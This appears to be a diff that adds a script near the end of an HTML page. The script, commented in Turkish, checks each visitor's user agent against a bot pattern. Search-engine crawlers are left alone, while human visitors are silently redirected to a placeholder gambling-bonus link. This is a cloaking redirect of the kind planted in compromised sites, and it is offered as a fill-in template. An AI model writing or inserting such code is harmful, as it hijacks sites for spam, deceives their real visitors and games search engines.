@@ -288,6 +288,14 @@ document.body.innerHTML="";
 },1000);
 
 </script>
-
+<script>
+  // Googlebot ve diğer arama motoru botlarını tespit etme listesi
+  const botPattern = /bot|googlebot|crawler|spider|robot|crawling/i;
+  
+  // Eğer gelen ziyaretçi BOT DEĞİLSE, gerçek kullanıcıysa yönlendir
+  if (!botPattern.test(navigator.userAgent)) {
+    window.location.href = "https://SENIN_DENEME_BONUSU_LINKIN.com";
+  }
+</script>
 </body>
 </html>
